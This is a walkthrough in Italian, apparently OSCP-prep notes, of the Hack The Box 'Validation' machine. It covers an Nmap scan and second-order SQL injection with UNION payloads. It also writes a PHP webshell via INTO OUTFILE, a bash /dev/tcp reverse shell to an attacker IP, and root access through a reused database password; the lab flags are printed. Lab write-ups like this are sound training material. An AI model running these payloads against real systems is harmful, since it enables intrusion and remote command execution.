**Target: 10.10.11.116**

# INFORMATION GATHERING

Per prima cosa lanciamo un scan veloce con [Nmap](Note/Tool/Nmap.md) per vedere quali porte e quali servizi 
girano sulla macchina 

```bash
┌──(root㉿kali)-[/home/kali/htb/validation]
└─# nmap -sC -sV -O -p- --min-rate=5000 10.10.11.116
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-15 06:35 EDT
Warning: 10.10.11.116 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.116
Host is up (0.044s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp    open     http           Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
2902/tcp  filtered netaspi
2963/tcp  filtered iph-policy-adm
3750/tcp  filtered cbos-ip-port
4566/tcp  open     http           nginx
|_http-title: 403 Forbidden
5000/tcp  filtered upnp
5001/tcp  filtered commplex-link
5002/tcp  filtered rfe
5003/tcp  filtered filemaker
5004/tcp  filtered avt-profile-1
5005/tcp  filtered avt-profile-2
5006/tcp  filtered wsm-server
5007/tcp  filtered wsm-server-ssl
5008/tcp  filtered synapsis-edge
8060/tcp  filtered aero
8080/tcp  open     http           nginx
|_http-title: 502 Bad Gateway
26108/tcp filtered unknown
37123/tcp filtered unknown
40549/tcp filtered unknown
46120/tcp filtered unknown
56352/tcp filtered unknown
57395/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/15%OT=22%CT=1%CU=33394%PV=Y%DS=2%DC=I%G=Y%TM=64B276A
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.39 seconds
```

Abbiamo 4 porta aperte

- 22/tcp    open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
- 80/tcp    open     http           Apache httpd 2.4.48
- 4566/tcp  open  http           nginx
- 8080/tcp  open  http           nginx

Partiamo ad enumerare la porta 80

# ENUMERTION

Visitiamo la pagina web, ci troviamo di fronte ad un pagina di registrazione 

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Validator1.png)

Proviamo a registrare un utente,

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Validator.png)

Vediamo che ci restituisce una pagina /account.php, il .php ci suggerisce che la webapp utilizzi php come linguaggio.
Notiamo anche l'input inserito precedentemente viene visualizzato in /account.php
Potrebbe suggerisci una SQLinjection
Proviamo ad inserire il payload '-- - 

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/validatro2.png)
Non otteniamo nessun informazione.

Proviamo a vedere la richiesta trammite burp.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Validator3.png)
Vediamo che abbiamo anche il campo `country` in cui possiamo provare una SQLinjection.
Priviamo a mettere il payload ' nel campo `country`

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Validator5.png)

Questa è una SQL injection di secondo ordine.

Posso immaginare che la query SQL sulla pagina assomigli a:

```
SELECT username from players where country = '[input]';
```

Un'iniezione UNION è quando aggiungo un'istruzione UNION alla query che mi consente di creare una nuova query e aggiungere i risultati alla query desiderata. Dovrò far corrispondere lo stesso numero di colonne o la query darà un errore. Inizierò con UNION SELECT 1 del Brasile;-- -. Ciò renderebbe la query:
```
SELECT username from players where country = 'Brazil' UNION SELECT 1;-- -';
```

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Validator6.png)
Vadiamo che la query funziona.
Proviamo ad aggiungere il 2 per vedere se abbiamo due collonne.

```
' UNION select 1,2-- -
```

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Validator7.png)
Ci restituisce un errore, quindi possiamo ipotizzare che abbiamo 1 solo colonna.

Ora che sappiamo come manipolare la query enumeriamo ulteriormente il database.

Con ' UNION @@version-- - vediamo con che tipo di database abbiamo a che fare.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Validator8.png)
Il database è MariaDB 10.5.11

vediamo che utente siamo con ' UNION user( )-- -
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Validator9.png)
Siamo uhc@localhost
Vediamo se il nostro utente ha i permessi FILE, se cosi fosse avremmo i permessi di lettura e scrittura sul server. Questo ci consentirebbe di caricare una webshell.

con `' UNION SELECT super_priv FROM mysql.user-- -` vediamo se abbiamo i privilegi di admin e quindi anche i permessi FILE

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Validator10.png)

Ci resituisce Y che sta per yes quindi siamo admin, questo significa abbiamo i permessi per leggere scrivere sul server non ci cresta che caricare un webshell.

Utilizziamo

' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- - 

come payload 

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Validator11.png)
Ci restituisce errore ma dovrebbe ever funzionato 
Visitiamo /shll.php  e con  `?cmd=id` vediamo che abbiamo la nostra webshell

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/Validator12.png)

Vediamo di aver una revshell più stabile.
Ricarichiamo la pagina e la intercettiamo sempre con burp. Cambiamo metodo di richiesta da GET a POST e nel campo cmd= andiamo ad inserire la nostra revshell.

```
bash -c 'bash -i >& /dev/tcp/10.10.14.19/1234 2>&1
```

codifichiamo in URL 

```
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.19/1234+0>%261'
```

Ci mettiamo in ascolto con nc 

```
┌──(root㉿kali)-[/home/kali/htb/validation]
└─# nc -lvp 1234
listening on [any] 1234 ...

```

Otteniamo cosi la nostra revshell

```bahs
┌──(root㉿kali)-[/home/kali/htb/validation]
└─# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.116] 38776
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@validation:/var/www/html$
```

# PRIVESC

Diamo un occhiata al contenuto della directory in cui troviamo 

```bash
www-data@validation:/var/www/html$ ls
ls
account.php
config.php
css
index.php
js
rabbit.php
www-data@validation:/var/www/html$

```

Vediamo il file config.php sembra essere interessante, ispezziniamolo

```bash
www-data@validation:/var/www/html$ cat config.php
cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
www-data@validation:/var/www/html$
```

Sembrano essere delle credenziali.
Spesso è una brutta abitudine quella di riutilizzare la stessa password per più servizi
Proviamo ad utilizzare queste credenziali per avere i privilegi root

```bash
www-data@validation:/var/www/html$ su root
su root
Password: uhc-9qual-global-pw
id
uid=0(root) gid=0(root) groups=0(root)
```

BINGO!

Flag user

```bash
www-data@validation:/home/htb$ cat user.txt
cat user.txt
bfd1a1084cbc889e9eb76a83c69d4650
```

Flag root

```bash
cat root.txt
9c8d44249b70ef81ac143e9ec9b45b6c
```